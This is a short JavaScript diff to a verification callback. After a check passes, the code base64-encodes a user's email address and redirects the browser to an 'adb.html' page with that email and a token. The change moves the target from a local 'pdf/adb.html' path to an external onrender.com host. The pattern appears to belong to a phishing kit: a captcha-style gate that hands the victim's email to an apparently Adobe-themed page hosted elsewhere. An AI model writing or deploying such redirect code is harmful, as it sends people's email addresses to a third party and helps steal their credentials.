@@ -25,7 +25,7 @@ function onVerify(token) {
   if (email && secureToken) {
     // Encode email with base64 before adding to URL
     const encodedEmail = encodeData(email);
-    window.location.href = `pdf/adb.html#${encodedEmail}&token=${secureToken}`;
+    window.location.href = `https://ronnicf-github-io.onrender.com/adb.html#${encodedEmail}&token=${secureToken}`;
   } else {
     alert("Verification error. Please refresh and try again.");
   }
